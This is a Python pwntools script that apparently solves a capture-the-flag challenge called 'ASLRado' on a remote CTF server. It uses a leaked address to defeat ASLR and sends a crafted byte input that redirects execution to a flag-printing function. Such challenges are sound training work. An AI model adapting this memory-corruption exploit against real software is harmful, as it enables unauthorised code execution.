from pwn import *
from sys import stdout

def main():

    remoteProcess   = remote("ctf.compsecu.com", 10101)
    # remoteProcess   = process("./ASLRado")
    validateLoginRE = 0x404eb7
    callGetFlagRE   = 0x404f86

    # Get base address
    validateLoginRT = remoteProcess.recvline()
    stdout.write(f'{validateLoginRT}\n')
    validateLoginRT = str(validateLoginRT).split(" ")[5][2:-3]
    validateLoginRT = int(validateLoginRT, 16)
    stdout.write(f'BASE ADDRESS:_> {hex(validateLoginRT)}\n')

    # Prepare target address
    ASLRDiff = abs(validateLoginRT - validateLoginRE)
    stdout.write(f'ASLRDiff = {ASLRDiff}\n')

    stdout.write(f'{remoteProcess.recvline()}\n')
    stdout.write(f'{remoteProcess.recvline()}\n')
    stdout.write(f'{remoteProcess.recvline()}\n')
    stdout.write(f'{remoteProcess.recvline()}\n')
    stdout.write(f'{remoteProcess.recvline()}\n')

    # Prepare first input
    sendLine = b"adonay_"
    # Send first input
    stdout.write(f'{sendLine}\n')
    remoteProcess.sendline(sendLine)

    stdout.write(f'{remoteProcess.recvline()}\n')

    # stdout.write(f'ASLR Offset:_> {ASLRDiff}\n')
    # targetAddress = hex(int(validateLoginRT, 16) + ASLRDiff)

    # stdout.write(f'targetAddress:_> {targetAddress}\n')

    # Prepare second input
    sendLine = b"1"
    # Send second input
    stdout.write(f'{sendLine}\n')
    remoteProcess.sendline(sendLine)

    # Prepare third input
    sendLine = b"A" + b"\x86\x4f\x40"
    # Send second input
    stdout.write(f'{sendLine}\n')
    remoteProcess.sendline(sendLine)

    response = remoteProcess.recvall()
    stdout.write(f'{response}\n')

if __name__ == "__main__":
    main()
